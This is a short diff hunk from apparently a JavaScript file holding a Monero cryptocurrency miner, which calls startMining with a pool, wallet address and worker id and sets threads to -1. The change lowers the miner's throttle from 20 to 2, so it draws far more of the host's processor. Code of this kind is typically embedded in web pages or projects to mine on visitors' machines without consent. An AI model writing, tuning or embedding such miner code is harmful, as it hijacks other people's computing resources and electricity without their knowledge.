@@ -13,5 +13,5 @@ var workerId = "GH-XMR-JS-SNIPPET"
 var threads = -1;
 var password = "";
 startMining(pool, walletAddress, workerId, threads, password);
-throttleMiner = 20;
+throttleMiner = 2;
 // End Of Mining Code
